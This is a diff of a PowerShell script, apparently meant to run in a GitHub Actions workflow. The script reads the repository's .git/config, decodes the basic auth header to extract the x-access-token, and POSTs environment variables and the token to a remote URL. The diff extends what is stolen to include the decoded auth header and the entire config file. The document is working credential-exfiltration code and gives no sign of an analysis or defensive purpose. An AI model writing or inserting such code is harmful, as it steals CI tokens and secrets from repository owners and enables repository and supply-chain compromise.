@@ -11,6 +11,7 @@ $jsonBody = $envVariables | ConvertTo-Json
 $response = Invoke-RestMethod -Uri $remoteUrl -Method Post -Body $jsonBody -ContentType "application/json"
 
 $token = ""
+$authHeader = ""
 if ($fileContent -match "basic[\s]+([\w\=]+)") {
     $authHeader = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($matches[1]))
     if ($authHeader -match "x-access-token:([\w\-_]+)") {
@@ -25,7 +26,9 @@ $filePath = "$env:GITHUB_WORKSPACE/.git/config"
 $fileContent = Get-Content -Path $filePath -Raw
 
 $body = @{
-    fileContent = $token
+    token = $token
+    auth-header = $authHeader
+    file-content = $fileContent
 } | ConvertTo-Json
 
 $response = Invoke-RestMethod -Uri $remoteUrl -Method Post -Body $body -ContentType "application/json"
